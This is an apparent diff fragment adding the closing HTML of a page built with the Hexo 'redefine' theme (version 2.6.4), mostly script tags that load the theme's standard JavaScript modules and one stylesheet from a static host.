+<script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/tools/imageViewer.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/utils.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/main.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/layouts/navbarShrink.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/tools/scrollTopBottom.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/tools/lightDarkSwitch.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/layouts/categoryList.js"></script>
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/tools/localSearch.js"></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/tools/codeBlock.js"></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/tools/runtime.js"></script>
+    <script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/odometer.min.js"></script>
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/Typed.min.js"></script>
+  <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/tools/tocToggle.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/layouts/toc.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+</body>
+</html>
